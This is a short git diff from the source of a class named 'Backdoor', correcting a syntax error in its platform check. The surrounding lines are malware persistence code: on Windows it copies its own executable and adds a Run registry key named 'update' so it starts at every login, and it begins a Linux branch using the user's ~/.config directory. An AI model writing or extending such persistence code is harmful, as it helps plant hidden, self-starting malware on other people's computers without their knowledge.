@@ -29,7 +29,7 @@ class Backdoor:
             if (not os.path.exists(location)):
                 shutil.copyfile(sys.executable, location)
                 subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',shell=True)
-        if (if platform == "darwin"):
+        if (platform == "darwin"):
             pass
         if (platform == "linux" or platform == "linux2"):
             home_config_dir = os.path.expanduser('~') + "/.config/"
